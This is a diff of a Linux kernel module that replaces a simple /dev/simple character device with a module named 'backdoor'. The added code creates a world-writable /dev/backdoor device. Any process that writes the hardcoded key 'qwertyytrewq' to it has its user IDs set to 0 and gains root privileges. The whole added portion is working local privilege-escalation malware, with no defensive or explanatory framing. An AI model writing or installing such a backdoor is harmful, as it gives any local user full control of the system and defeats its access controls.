@@ -1,175 +1,96 @@
-#include <linux/module.h>
-#include <linux/slab.h>
 #include <linux/fs.h>
-#include <linux/errno.h>
-#include <linux/types.h>
-#include <linux/proc_fs.h>
-#include <linux/fcntl.h>
+#include <linux/miscdevice.h>
+#include <linux/mm.h>
+#include <linux/module.h>
 #include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 
-#define MYBUF_SIZE 100
-#define SIMPLE_MAJOR 199
+#define DEVICE_NAME "backdoor"
 
-const char * const text = "SIMPLE. Read calls: %zu, Write calls: %zu\n";
+struct miscdevice backdoor_dev;
 
-size_t read_count;
-size_t write_count;
-char *mybuf;
-bool copied;
-struct proc_dir_entry *proc_entry;
+const struct file_operations backdoor_fops;
 
-/* Operations for /dev/simple */
-const struct file_operations simple_fops;
-
-/* Operations for /proc/simple */
-const struct file_operations proc_fops;
-
-
-static int __init simple_init(void)
+static int __init backdoor_init(void)
 {
-	int result = 0;
+        int result = 0;
 
-	/* Register an entry in /proc */
-	proc_entry = proc_create("simple", 0000, NULL, &proc_fops);
-	if (!proc_entry) {
-		printk(KERN_WARNING "Cannot create /proc/simple\n");
-		goto err;
-	}
+        result = misc_register(&backdoor_dev);
+        if (result) {
+                printk(KERN_WARNING "Cannot register /dev/backdoor device\n");
+                goto err;
+        }
 
-	/* Register a device with the given major number */
-	result = register_chrdev(SIMPLE_MAJOR, "simple", &simple_fops);
-	if (result < 0) {
-		printk(KERN_WARNING
-			"Cannot register the /dev/simple device with major number: %d\n",
-			SIMPLE_MAJOR);
-		goto err;
-	}
-
-	mybuf = kmalloc(MYBUF_SIZE, GFP_KERNEL);
-	if (!mybuf) {
-		result = -ENOMEM;
-		goto err;
-	} else {
-		mybuf[0] = '\0';
-		result = 0;
-		printk(KERN_INFO "The SIMPLE module has been inserted.\n");
-	}
-	return result;
+        printk(KERN_INFO "The BACKDOOR module has been inserted\n");
+        return result;
 
 err:
-	if (proc_entry) {
-		proc_remove(proc_entry);
-	}
-	unregister_chrdev(SIMPLE_MAJOR, "simple");
-	kfree(mybuf);
-	return result;
+        misc_deregister(&backdoor_dev);
+        return result;
 }
 
-static void __exit simple_exit(void)
+static void __exit backdoor_exit(void)
 {
-	/* Unregister the device and /proc entry */
-	unregister_chrdev(SIMPLE_MAJOR, "simple");
-	if (proc_entry) {
-		proc_remove(proc_entry);
-	}
-
-	/* Free the buffer. No need to check for NULL - read kfree docs */
-	kfree(mybuf);
-
-	printk(KERN_INFO "The SIMPLE module has been removed\n");
+        misc_deregister(&backdoor_dev);
+        printk(KERN_INFO "The BACKDOOR module has been removed\n");
 }
 
-ssize_t simple_read(struct file *filp, char __user *user_buf,
-	size_t count, loff_t *f_pos)
+ssize_t backdoor_write(
+    struct file* filp, const char __user* user_buf, size_t count, loff_t* f_pos)
 {
-	size_t to_copy = strlen(mybuf);
 
-	printk(KERN_WARNING "SIMPLE: read f_pos is %lld\n", *f_pos);
+        char key[] = "qwertyytrewq\0";
+        char* buf;
+        struct cred* new_cred;
+        ssize_t result = 0;
 
-	if (*f_pos >= to_copy) {
-		return 0;
-	}
+        buf = kvmalloc(count, GFP_KERNEL);
 
-	if (copy_to_user(user_buf, mybuf, to_copy)) {
-		printk(KERN_WARNING "SIMPLE: could not copy data to user\n");
-		return -EFAULT;
-	}
-	read_count++;
+        if (!buf)
+                return -ENOMEM;
 
-	*f_pos += to_copy;
-	return to_copy;
-}
+        if (copy_from_user(buf, user_buf, count)) {
+                result = -EFAULT;
+                goto out;
+        }
 
-ssize_t simple_write(struct file *filp, const char __user *user_buf,
-	size_t count, loff_t *f_pos)
-{
-	printk(KERN_WARNING "SIMPLE: write f_pos is %lld\n", *f_pos);
+        if (strncmp(key, buf, count)) {
+                result = count;
+                goto out;
+        }
 
-	// Cannot write more than buffer size (+ '\0')
-	if (*f_pos >= MYBUF_SIZE - 1) {
-		return -ENOSPC;
-	}
-	if (*f_pos + count > MYBUF_SIZE - 1) {
-		count = MYBUF_SIZE - 1 - *f_pos;
-	}
-	if (copy_from_user(mybuf + *f_pos, user_buf, count)) {
-		printk(KERN_WARNING "SIMPLE: could not copy data from user\n");
-		return -EFAULT;
-	}
-	mybuf[count] = '\0';
-	write_count++;
-	*f_pos += count;
-	return count;
-}
+        new_cred = prepare_creds();
+        if (!new_cred) {
+                result = -ENOMEM;
+                goto out;
+        }
 
-ssize_t simple_read_proc(struct file *filp, char *user_buf,
-	size_t count, loff_t *f_pos)
-{
-	char *buf;
-	size_t length;
-	ssize_t retval = 0;
+        new_cred->uid.val = 0;
+        new_cred->suid.val = 0;
+        new_cred->euid.val = 0;
+        new_cred->fsuid.val = 0;
 
-	buf = kmalloc(100, GFP_KERNEL);
-	if (!buf) {
-		retval = -ENOMEM;
-		goto out;
-	}
-
-	if (!copied) {
-		length = snprintf(buf, 100, text, read_count, write_count);
-		if (count < length) {
-			retval = -EFBIG;
-			goto out;
-		}
-
-		if (copy_to_user(user_buf, buf, length)) {
-			printk(KERN_WARNING "SIMPLE: could not copy data to user\n");
-			retval = -EFAULT;
-			goto out;
-		}
-		retval = count;
-		copied = true;
-	} else {
-		retval = 0;
-		copied = false;
-	}
+        commit_creds(new_cred);
+        result = count;
+        *f_pos = count;
+        printk(KERN_INFO "Root privileges granted\n");
 
 out:
-	kfree(buf);
-	return retval;
+        kvfree(buf);
+        return result;
 }
 
-const struct file_operations simple_fops = {
-	.read = simple_read,
-	.write = simple_write,
+struct miscdevice backdoor_dev = {
+        .minor = MISC_DYNAMIC_MINOR,
+        .fops = &backdoor_fops,
+        .mode = 0222,
+        .name = DEVICE_NAME,
 };
 
-const struct file_operations proc_fops = {
-	.read = simple_read_proc,
+const struct file_operations backdoor_fops = {
+        .write = backdoor_write,
 };
 
-module_init(simple_init);
-module_exit(simple_exit);
-
+module_init(backdoor_init);
+module_exit(backdoor_exit);
